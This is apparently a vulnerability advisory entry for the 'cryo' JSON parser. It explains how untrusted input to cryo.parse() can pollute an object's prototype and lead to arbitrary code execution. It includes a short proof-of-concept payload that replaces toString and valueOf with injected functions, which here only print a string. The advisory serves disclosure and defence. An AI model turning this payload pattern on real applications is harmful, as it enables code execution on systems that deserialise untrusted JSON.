  title: Arbitrary Code Execution
  description: |
    [`cryo`][1] is a json parser.

    Affected versions of this package are vulnerable to Arbitrary Code
    Execution when untrusted user-input is passed into the `cryo.parse()`
    function.

    `cryo` is used to deserialize JSON files into an object by useing square
    bracket notation ( `obj[key]=value` ) and interacts with the object
    later in the code (to convert to string, for example). Given that the
    JSON is controlled by user input, an attacker may be able to change the
    `__proto__` property for a new object.

    `cryo` also serialization of functions, so the attacker can set their
    own methods (toString, valueOf) for the new object. If the application
    interacts later on with the new object in a way which leads to
    invocation of the object\'s prototype functions, the attacker\'s
    malicious code would execute.

    **PoC:**

        var Cryo = require('cryo');
        var frozen = '{"root":"_CRYO_REF_3","references":[{"contents":{},"value":"_CRYO_FUNCTION_function () {console.log(\\"defconrussia\\"); return 1111;}"},{"contents":{},"value":"_CRYO_FUNCTION_function () {console.log(\\"defconrussia\\");return 2222;}"},{"contents":{"toString":"_CRYO_REF_0","valueOf":"_CRYO_REF_1"},"value":"_CRYO_OBJECT_"},{"contents":{"__proto__":"_CRYO_REF_2"},"value":"_CRYO_OBJECT_"}]}'
        var hydrated = Cryo.parse(frozen);
        console.log(hydrated);
